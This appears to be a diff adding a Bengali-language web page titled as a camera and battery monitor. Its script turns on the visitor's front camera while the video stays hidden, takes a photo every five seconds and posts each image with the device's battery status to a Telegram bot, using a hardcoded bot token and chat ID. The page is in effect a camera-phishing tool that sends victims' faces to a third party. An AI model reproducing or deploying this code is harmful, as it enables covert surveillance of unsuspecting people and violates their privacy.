@@ -1,0 +1,118 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📸 ক্যামেরা ও ব্যাটারি মনিটর</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      text-align: center;
+      padding: 30px;
+    }
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>📷 ক্যামেরা + 🔋 ব্যাটারি রিপোর্ট</h2>
+  <p>📌 অনুমতি দিন এবং সিস্টেম শুরু করুন</p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <br><br>
+  <button onclick="startCamera()">▶️ শুরু করুন</button>
+  <p id="status">⏳ অপেক্ষা করছি...</p>
+
+  <script>
+    const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
+    const CHAT_ID = "1054739462";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+
+    let intervalId;
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          video.srcObject = stream;
+          status.innerText = "✅ ক্যামেরা চালু হয়েছে, প্রতি ৫ সেকেন্ডে তথ্য পাঠানো হবে...";
+
+          intervalId = setInterval(() => {
+            takePhotoAndSend();
+          }, 5000);
+        })
+        .catch(err => {
+          status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
+          console.error(err);
+        });
+    }
+
+    function takePhotoAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataUrl = canvas.toDataURL('image/jpeg');
+      const formData = createFormData(dataUrl);
+
+      navigator.getBattery().then(function(battery) {
+        const level = Math.round(battery.level * 100);
+        const charging = battery.charging ? "🔌 চার্জিং" : "🔋 চার্জিং নয়";
+        const batteryStatus = `🔋 Battery: ${level}% (${charging})`;
+
+        formData.append("caption", batteryStatus);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(res => {
+          if (res.ok) {
+            console.log("✅ ছবি পাঠানো হয়েছে");
+            status.innerText = `📸 পাঠানো হয়েছে (${batteryStatus})`;
+          } else {
+            status.innerText = "⚠️ ছবি পাঠাতে সমস্যা হয়েছে!";
+          }
+        })
+        .catch(err => {
+          console.error("🚫 নেটওয়ার্ক সমস্যা", err);
+          status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
+        });
+      });
+    }
+
+    function createFormData(dataUrl) {
+      const formData = new FormData();
+      const blob = dataURItoBlob(dataUrl);
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+      return formData;
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
